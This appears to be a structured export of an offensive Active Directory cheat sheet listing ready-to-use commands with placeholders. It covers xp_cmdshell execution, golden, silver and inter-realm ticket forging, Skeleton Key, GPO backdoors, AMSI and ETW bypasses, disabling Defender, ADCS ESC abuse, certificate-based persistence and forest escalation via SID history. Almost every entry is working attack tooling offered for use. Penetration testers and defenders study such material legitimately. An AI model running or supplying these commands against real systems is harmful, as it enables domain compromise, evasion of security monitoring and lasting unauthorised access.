commands.description: Enable and use xp_cmdshell for OS command execution from SQL.
commands.command:
# In mssqlclient:
enable_xp_cmdshell
xp_cmdshell whoami

# netexec one-liner:
netexec mssql {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -x "whoami"

# Capture/relay SQL service NetNTLM hash:
netexec mssql {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M mssql_priv

commands.title: MSSQL Linked Server Chaining
commands.description: Pivot across trusted linked SQL servers — often runs as higher privilege.
commands.command:
# Enumerate linked servers
enum_links

# Execute on a linked server
exec_as_login {LINKED_LOGIN}
EXEC ('xp_cmdshell ''whoami''') AT [{LINKED_SERVER}]

commands.title: Golden Ticket (Mimikatz)
commands.description: Forge TGT using krbtgt hash — persistent DA access.
commands.command:
# Get domain SID first:
Get-DomainSID  # PowerView

# Create golden ticket:
mimikatz # kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{DOMAIN_SID} /krbtgt:{NTLM_HASH} /ptt

# Rubeus:
.\Rubeus.exe golden /rc4:{NTLM_HASH} /domain:{DOMAIN} /sid:{DOMAIN_SID} /user:Administrator /ptt

commands.title: Golden Ticket (impacket)
commands.description: Create golden ticket on Linux for use with impacket tools.
commands.command:
impacket-ticketer -nthash {NTLM_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass

commands.title: Silver Ticket (Mimikatz)
commands.description: Forge TGS for specific service — stealthier than golden ticket.
commands.command:
mimikatz # kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{DOMAIN_SID} /target:{TARGET_COMPUTER}.{DOMAIN} /service:cifs /rc4:{NTLM_HASH} /ptt

# Common services: cifs, host, http, wsman, ldap, mssql

commands.title: Skeleton Key (Mimikatz)
commands.description: Patch LSASS on DC — use 'mimikatz' as password for any account.
commands.command:
# Must run on DC with DA rights:
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now any account can auth with password "mimikatz"

commands.title: AdminSDHolder Backdoor
commands.description: Add user to AdminSDHolder ACL — propagated to all protected groups.

commands.title: Backdoor GPO (SharpGPOAbuse)
commands.description: Embed persistence via scheduled task in a GPO.
commands.command: .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Persistence" --Author {DOMAIN}\{USERNAME} --Command "powershell.exe" --Arguments '-enc <BASE64_PAYLOAD>' --GPOName "Target GPO"

commands.title: AMSI Bypass (Memory Patch)
commands.description: Patch AMSI in memory to disable scanning of scripts.
commands.command:
# Method 1 - Reflection patch:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2 - Matt Graeber:
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null), 0)

# Method 3 - Obfuscated:
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$b=$a.GetField('amsiInitFailed','NonPublic,Static');
$b.SetValue($null,$true)

commands.title: AMSI Bypass (Invoke-Obfuscation)
commands.description: Obfuscate PowerShell scripts to bypass AMSI detection.
commands.command:
Import-Module .\Invoke-Obfuscation.ps1
Invoke-Obfuscation
# SELECT TOKEN -> ALL -> 1 (Token obfuscation)

# Or use string manipulation:
$c = 'Am'+'siUtils'; $a=[Ref].Assembly.GetType("System.Management.Automation.$c")

commands.title: Disable Defender (requires admin)
commands.description: Disable Windows Defender — extremely noisy, logged by EDR.
commands.command:
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath C:\ 

# Via CME:
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M defender

commands.title: Defender Exclusion Adding
commands.description: Add exclusion path to avoid scanning your tools.
commands.command:
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionExtension ".exe,.ps1"
Add-MpPreference -ExclusionProcess "mimikatz.exe"

commands.title: ETW Patching
commands.description: Patch Event Tracing for Windows to blind logging.
commands.command:
# ETW patch in PowerShell:
[Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.Registry') | Out-Null
$a = [Threading.Thread]::GetDomain().Load([Convert]::FromBase64String("..."))

# Or via clrjit.dll patch method
# *** Use specific ETW bypass tools like SilentMoonwalk ***

commands.title: Request TGT (Rubeus)
commands.description: Request a TGT for a user.
commands.command:
.\Rubeus.exe asktgt /user:{USERNAME} /password:{PASSWORD} /domain:{DOMAIN} /dc:{DC_IP} /ptt
.\Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /domain:{DOMAIN} /dc:{DC_IP} /ptt

commands.title: Request TGT (impacket)
commands.description: Request TGT from Linux.

commands.title: List Tickets (klist / Rubeus)
commands.description: Enumerate cached Kerberos tickets on the system.
commands.command:
klist  # Built-in
.\Rubeus.exe klist
.\Rubeus.exe dump /nowrap  # Dump tickets

commands.title: Overpass-the-Hash (impacket)
commands.description: Convert NTLM hash to Kerberos TGT.
commands.command:
impacket-getTGT {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH}
export KRB5CCNAME={USERNAME}.ccache

# Rubeus:
.\Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /domain:{DOMAIN} /ptt

commands.title: Constrained Delegation S4U
commands.description: S4U2Self + S4U2Proxy to impersonate any user to a service.
commands.command: .\Rubeus.exe s4u /user:{USERNAME} /rc4:{NTLM_HASH} /impersonateuser:Administrator /msdsspn:"cifs/{TARGET_COMPUTER}.{DOMAIN}" /ptt /nowrap

commands.title: Find CAs & Vulnerable Templates (Certipy)
commands.description: Enumerate ADCS — find the CA, certificate templates, and auto-flag ESC1-ESC8 misconfigs.
commands.command:
# Full enumeration — outputs JSON + text, flags vulnerabilities
certipy find -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} -stdout

# Only show vulnerable templates (recommended first look)
certipy find -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} -vulnerable -stdout

# With NTLM hash, save BloodHound-importable output
certipy find -u {USERNAME}@{DOMAIN} -hashes :{NTLM_HASH} -dc-ip {DC_IP} -vulnerable -bloodhound

commands.title: Enumerate ADCS (Certify / Windows)
commands.description: Windows-side ADCS enumeration with Certify — find vulnerable templates.
commands.command:
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Find all CAs
.\Certify.exe cas

# Show templates allowing enrollment for current user
.\Certify.exe find /enrolleeSuppliesSubject

commands.title: ESC1 Abuse (Certipy)
commands.description: Template allows enrollee-supplied SAN + client auth. Request a cert AS a Domain Admin.

commands.title: ESC1 Abuse (Certify + Rubeus)
commands.description: Windows-side ESC1: request cert with alt name, convert, then PTT.
commands.command:
# 1. Request impersonation cert
.\Certify.exe request /ca:{CA_NAME} /template:{TEMPLATE} /altname:administrator

# 2. Convert PEM -> PFX (paste cert+key into cert.pem)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 3. Auth with cert to get TGT
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:{PASSWORD} /ptt

subsections.label: ESC8 — NTLM Relay to AD CS

commands.title: ESC8 Relay to Web Enrollment (Certipy)
commands.description: Relay coerced machine auth to the CA HTTP enrollment endpoint to obtain a DC certificate.

commands.title: ESC4 — Template ACL Takeover
commands.description: You have write rights over a template — reconfigure it to be ESC1-vulnerable, then abuse.
commands.command:
# Make the template vulnerable (enrollee supplies subject + client auth)
certipy template -u {USERNAME}@{DOMAIN} -p {PASSWORD} -template {TEMPLATE} -dc-ip {DC_IP} -write-default-configuration

# Then request as ESC1
certipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}

commands.title: ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
commands.description: CA accepts arbitrary SAN on ANY template — request impersonation cert directly.
commands.command:
certipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template User -upn administrator@{DOMAIN}
certipy auth -pfx administrator.pfx -dc-ip {DC_IP}

commands.title: ESC9/10 — No Security Extension
commands.description: Abuse weak cert mapping (szOID_NTDS_CA_SECURITY_EXT missing) with GenericWrite over a victim.

commands.title: Cert Theft & Persistence (THEFT/PERSIST)
commands.description: Steal existing certs from machines (THEFT1-5) or enroll a user cert for long-term persistence.
commands.command:
# Extract certs from the local machine store (Windows)
.\Certify.exe list

# Persistence: enroll a User cert (valid ~1yr, survives password resets)
.\Certify.exe request /ca:{CA_NAME} /template:User

# Certipy: extract from PFX you already hold
certipy cert -pfx user.pfx -nokey -out user.crt

commands.title: Enumerate Domain & Forest Trusts
commands.description: Map all trust relationships — direction, transitivity, and SID filtering.
commands.command:
# PowerView
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust

# nltest (built-in)
nltest /domain_trusts /all_trusts

# netexec
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M enum_trusts

commands.title: Child-to-Parent via SID History (Golden)
commands.description: From child DA, forge an inter-realm golden ticket with Enterprise Admins SID history to own the forest root.
commands.command:
# Need: child krbtgt hash, child domain SID, parent (root) domain SID
# Get root domain SID + Enterprise Admins SID (ends -519)

# impacket (raiseChild automates the whole chain):
impacket-raiseChild {CHILD_DOMAIN}/{USERNAME}:{PASSWORD}

# Manual golden w/ SID history (Mimikatz):
kerberos::golden /user:Administrator /domain:{CHILD_DOMAIN} /sid:{CHILD_SID} /krbtgt:{NTLM_HASH} /sids:{ROOT_SID}-519 /ptt

commands.title: Inter-Realm Trust Ticket (External Trust)
commands.description: Forge a trust (inter-realm TGT) using the trust key to access a trusting domain.
commands.command:
# Dump the trust key (RC4) of the trust account:
lsadump::trust /patch    # Mimikatz on DC

# Forge inter-realm ticket and request a TGS in target domain (Rubeus):
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/{TARGET_COMPUTER}.{TARGET_DOMAIN} /dc:{TARGET_DC} /ptt
